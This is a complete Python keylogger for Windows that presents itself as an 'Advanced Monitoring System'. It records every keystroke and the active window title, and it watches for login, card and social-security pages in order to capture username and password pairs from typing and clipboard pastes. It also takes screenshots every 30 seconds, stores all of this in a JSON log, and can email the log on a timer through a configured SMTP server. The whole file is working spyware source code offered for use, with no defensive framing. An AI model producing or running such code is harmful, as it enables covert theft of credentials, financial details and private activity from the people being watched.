import keyboard
import time
from datetime import datetime
import win32gui
import win32clipboard
from bs4 import BeautifulSoup
import requests
import re
import json
import os
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
import threading
import pyautogui
import pyscreenshot as ImageGrab

# Configuration
CONFIG = {
    "LOG_FILE": "activity_log.json",
    "SCREENSHOTS_DIR": "screenshots",
    "PRINT_TO_TERMINAL": True,
    "CAPTURE_CLIPBOARD": True,
    "DETECT_PASSWORD_FIELDS": True,
    "CAPTURE_SCREENSHOTS": True,
    "SCREENSHOT_INTERVAL": 30,  # seconds
    "EMAIL_REPORT": False,
    "EMAIL_INTERVAL": 300,  # seconds
    "SMTP_SERVER": "smtp.example.com",
    "SMTP_PORT": 587,
    "EMAIL_FROM": "your_email@example.com",
    "EMAIL_TO": "recipient@example.com",
    "EMAIL_USER": "your_email@example.com",
    "EMAIL_PASS": "your_password"
}

# Global variables
current_window = ""
typed_text = ""
last_activity_time = time.time()
credentials_buffer = {}
activity_log = []
screenshot_counter = 1

def ensure_directory_exists(directory):
    if not os.path.exists(directory):
        os.makedirs(directory)

def get_active_window():
    try:
        window = win32gui.GetForegroundWindow()
        title = win32gui.GetWindowText(window)
        return title
    except:
        return "Unknown Window"

def get_clipboard():
    try:
        win32clipboard.OpenClipboard()
        data = win32clipboard.GetClipboardData()
        win32clipboard.CloseClipboard()
        return data
    except:
        return None

def is_browser_window(window_title):
    browsers = ["Chrome", "Firefox", "Edge", "Internet Explorer", "Opera", "Safari"]
    return any(browser in window_title for browser in browsers)

def extract_domain(window_title):
    # Improved URL extraction
    match = re.search(r"(https?://[^\s/]+)", window_title)
    if match:
        return match.group(1)
    return window_title

def detect_sensitive_field(window_title):
    sensitive_indicators = [
        "login", "sign in", "password", "passwd", "pwd", 
        "authenticate", "credit card", "cvv", "ssn", 
        "social security", "bank account", "secret"
    ]
    window_lower = window_title.lower()
    return any(indicator in window_lower for indicator in sensitive_indicators)

def take_screenshot():
    global screenshot_counter
    try:
        ensure_directory_exists(CONFIG["SCREENSHOTS_DIR"])
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"{CONFIG['SCREENSHOTS_DIR']}/screenshot_{timestamp}_{screenshot_counter}.png"
        screenshot = ImageGrab.grab()
        screenshot.save(filename)
        screenshot_counter += 1
        return filename
    except Exception as e:
        print(f"Screenshot failed: {str(e)}")
        return None

def log_activity(event_type, data):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    entry = {
        "timestamp": timestamp,
        "type": event_type,
        "data": data,
        "window": current_window,
        "url": extract_domain(current_window) if is_browser_window(current_window) else None
    }
    
    activity_log.append(entry)
    
    if CONFIG["PRINT_TO_TERMINAL"]:
        print(f"[{timestamp}] [{entry['url'] or current_window}] {event_type.upper()}: {data}")
    
    # Save to JSON log file
    with open(CONFIG["LOG_FILE"], "w", encoding="utf-8") as f:
        json.dump(activity_log, f, indent=2)

def send_email_report():
    if not CONFIG["EMAIL_REPORT"]:
        return
        
    try:
        msg = MIMEMultipart()
        msg['From'] = CONFIG["EMAIL_FROM"]
        msg['To'] = CONFIG["EMAIL_TO"]
        msg['Subject'] = f"Activity Report - {datetime.now().strftime('%Y-%m-%d %H:%M')}"
        
        # Create email body
        body = "Activity Log:\n\n"
        for entry in activity_log[-20:]:  # Send last 20 entries
            body += f"{entry['timestamp']} - {entry['type']}: {entry['data']}\n"
        
        msg.attach(MIMEText(body, 'plain'))
        
        # Attach log file
        with open(CONFIG["LOG_FILE"], "rb") as f:
            part = MIMEText(f.read().decode("utf-8"), "plain")
            part.add_header('Content-Disposition', 'attachment', filename="activity_log.json")
            msg.attach(part)
        
        # Connect to server and send
        server = smtplib.SMTP(CONFIG["SMTP_SERVER"], CONFIG["SMTP_PORT"])
        server.starttls()
        server.login(CONFIG["EMAIL_USER"], CONFIG["EMAIL_PASS"])
        server.send_message(msg)
        server.quit()
        
        log_activity("system", "Email report sent successfully")
    except Exception as e:
        log_activity("error", f"Email failed: {str(e)}")

def screenshot_timer():
    while True:
        if CONFIG["CAPTURE_SCREENSHOTS"]:
            screenshot_path = take_screenshot()
            if screenshot_path:
                log_activity("screenshot", f"Saved to {screenshot_path}")
        time.sleep(CONFIG["SCREENSHOT_INTERVAL"])

def email_timer():
    while True:
        if CONFIG["EMAIL_REPORT"]:
            send_email_report()
        time.sleep(CONFIG["EMAIL_INTERVAL"])

def on_key_press(event):
    global current_window, typed_text, last_activity_time, credentials_buffer
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    window_title = get_active_window()
    
    # Check if window changed
    if window_title != current_window:
        if typed_text and current_window:
            # Check if we were typing something sensitive before window changed
            if detect_sensitive_field(current_window):
                if "username" not in credentials_buffer:
                    credentials_buffer["username"] = typed_text
                else:
                    credentials_buffer["password"] = typed_text
                    credentials_buffer["url"] = extract_domain(current_window)
                    credentials_buffer["source"] = "typing"
                    log_activity("credentials", credentials_buffer)
                    credentials_buffer = {}
        
        current_window = window_title
        typed_text = ""
        log_activity("window_change", window_title)
    
    # Handle special keys
    if event.name == "enter":
        if typed_text and is_browser_window(current_window):
            # Check if this might be a form submission
            if "username" in credentials_buffer:
                credentials_buffer["password"] = typed_text
                credentials_buffer["url"] = extract_domain(current_window)
                credentials_buffer["source"] = "form submission"
                log_activity("credentials", credentials_buffer)
                credentials_buffer = {}
            elif detect_sensitive_field(current_window):
                if typed_text:  # Might be username
                    credentials_buffer["username"] = typed_text
        typed_text = ""
    elif event.name == "tab":
        if typed_text and detect_sensitive_field(current_window):
            if "username" not in credentials_buffer:
                credentials_buffer["username"] = typed_text
            else:
                credentials_buffer["password"] = typed_text
            typed_text = ""
    elif event.name == "space":
        typed_text += " "
    elif len(event.name) == 1:  # Regular character
        typed_text += event.name
    
    # Check clipboard for potential copied sensitive data
    if CONFIG["CAPTURE_CLIPBOARD"] and event.name == "ctrl+v":
        clipboard_content = get_clipboard()
        if clipboard_content and len(clipboard_content) < 100:  # Basic check to avoid large pastes
            if detect_sensitive_field(current_window):
                if "username" not in credentials_buffer:
                    credentials_buffer["username"] = clipboard_content
                else:
                    credentials_buffer["password"] = clipboard_content
                    credentials_buffer["url"] = extract_domain(current_window)
                    credentials_buffer["source"] = "clipboard"
                    log_activity("credentials", credentials_buffer)
                    credentials_buffer = {}
                log_activity("clipboard", f"Pasted content in sensitive field: {clipboard_content[:50]}...")
            else:
                log_activity("clipboard", f"Pasted content: {clipboard_content[:50]}...")
    
    last_activity_time = time.time()
    
    # Log regular keystrokes (but not in sensitive fields to reduce noise)
    if not detect_sensitive_field(current_window):
        log_activity("keystroke", event.name)

# Main execution
if __name__ == "__main__":
    ensure_directory_exists(CONFIG["SCREENSHOTS_DIR"])
    
    print("=== Advanced Monitoring System ===")
    print("Features:")
    print("- Keystroke logging (terminal + JSON file)")
    print("- Credential capture (forms, clipboard)")
    print("- Sensitive field detection")
    print(f"- Screenshots every {CONFIG['SCREENSHOT_INTERVAL']}s" if CONFIG["CAPTURE_SCREENSHOTS"] else "")
    print(f"- Email reports every {CONFIG['EMAIL_INTERVAL']}s" if CONFIG["EMAIL_REPORT"] else "")
    print("\nPress Ctrl+C to stop\n")
    
    # Start background threads
    if CONFIG["CAPTURE_SCREENSHOTS"]:
        threading.Thread(target=screenshot_timer, daemon=True).start()
    
    if CONFIG["EMAIL_REPORT"]:
        threading.Thread(target=email_timer, daemon=True).start()
    
    keyboard.on_press(on_key_press)
    
    try:
        while True:
            # Check for inactivity timeout
            if time.time() - last_activity_time > 10 and typed_text:
                typed_text = ""  # Reset buffer after inactivity
            time.sleep(0.1)
    except KeyboardInterrupt:
        print("\nStopping monitoring...")
        # Final save before exiting
        with open(CONFIG["LOG_FILE"], "w", encoding="utf-8") as f:
            json.dump(activity_log, f, indent=2)
        print(f"Log saved to {CONFIG['LOG_FILE']}")
        print("Monitoring stopped")
